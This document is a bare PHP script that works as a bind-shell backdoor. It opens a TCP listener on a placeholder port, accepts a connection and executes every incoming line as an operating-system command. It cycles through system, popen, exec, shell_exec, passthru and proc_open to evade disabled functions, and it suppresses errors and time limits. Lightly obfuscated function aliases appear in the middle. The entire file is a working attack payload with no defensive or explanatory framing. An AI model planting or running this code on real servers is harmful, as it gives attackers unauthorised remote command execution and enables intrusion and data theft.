
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time', 0);
$OPEg = @ini_get('disable_functions');
if (!empty($OPEg)) {
  $OPEg = preg_replace('/[, ]+/', ',', $OPEg);
  $OPEg = explode(',', $OPEg);
  $OPEg = array_map('trim', $OPEg);
} else {
  $OPEg = array();
}

$port = intval("__PORT__");

$sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$ret = @socket_bind($sock, "0.0.0.0", $port);
$ret = @socket_listen($sock, 5);

$msgsock = @socket_accept($sock);
@socket_close($sock);

while (FALSE !== @socket_select($r = array($msgsock), $w = NULL, $e = NULL, NULL)) {
  $o = '';
  $c = @socket_read($msgsock, 2048, PHP_NORMAL_READ);
  if (FALSE === $c) {
    break;
  }
  if (substr($c, 0, 3) == 'cd ') {
    chdir(substr($c, 3, -1));
  } else if (substr($c, 0, 4) == 'quit' || substr($c, 0, 4) == 'exit') {
    break;
  } else {

    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
      $c = $c . " 2>&1\n";
    }
    $tymX = 'is_callable';
    $bWfGMY = 'in_array';

    if ($tymX('system') and !$bWfGMY('system', $OPEg)) {
      ob_start();
      system($c);
      $o = ob_get_contents();
      ob_end_clean();
    } else
      if ($tymX('popen') and !$bWfGMY('popen', $OPEg)) {
      $fp = popen($c, 'r');
      $o = NULL;
      if (is_resource($fp)) {
        while (!feof($fp)) {
          $o .= fread($fp, 1024);
        }
      }
      @pclose($fp);
    } else
      if ($tymX('exec') and !$bWfGMY('exec', $OPEg)) {
      $o = array();
      exec($c, $o);
      $o = join(chr(10), $o) . chr(10);
    } else
      if ($tymX('shell_exec') and !$bWfGMY('shell_exec', $OPEg)) {
      $o = shell_exec($c);
    } else
      if ($tymX('passthru') and !$bWfGMY('passthru', $OPEg)) {
      ob_start();
      passthru($c);
      $o = ob_get_contents();
      ob_end_clean();
    } else
      if ($tymX('proc_open') and !$bWfGMY('proc_open', $OPEg)) {
      $handle = proc_open($c, array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')), $pipes);
      $o = NULL;
      while (!feof($pipes[1])) {
        $o .= fread($pipes[1], 1024);
      }
      @proc_close($handle);
    } else {
      $o = 0;
    }
  }
  @socket_write($msgsock, $o, strlen($o));
}
@socket_close($msgsock);
